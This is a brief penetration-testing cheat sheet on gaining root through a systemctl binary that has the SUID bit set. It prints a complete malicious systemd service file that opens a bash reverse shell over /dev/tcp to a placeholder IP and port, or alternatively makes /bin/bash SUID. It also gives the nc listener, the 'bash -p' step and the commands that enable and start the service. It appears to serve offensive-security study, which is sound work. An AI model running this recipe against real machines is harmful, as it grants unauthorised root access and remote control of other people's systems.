# systemctl (SUID)

{% embed url="https://gtfobins.github.io/gtfobins/systemctl#suid" %}

{% embed url="https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49" %}

```
$ cat <<EOF > root.service
>[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/sh -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
# Alternatively
# ExecStart=/bin/sh -c 'chmod +s /bin/bash'

[Install]
WantedBy=multi-user.target
>EOF
```

```
# Listen on <port>
$ nc -nlvp <port>

# For set /bin/bash as suid binary approach, simply run:
$ bash -p
```

```
/bin/systemctl enable /dev/shm/root.service
/bin/systemctl start root
```

Additional reading on how to create a Linux service with systemd

* [https://medium.com/@benmorel/creating-a-linux-service-with-systemd-611b5c8b91d6](https://medium.com/@benmorel/creating-a-linux-service-with-systemd-611b5c8b91d6)
* [https://unix.stackexchange.com/questions/404667/systemd-service-what-is-multi-user-target](https://unix.stackexchange.com/questions/404667/systemd-service-what-is-multi-user-target)
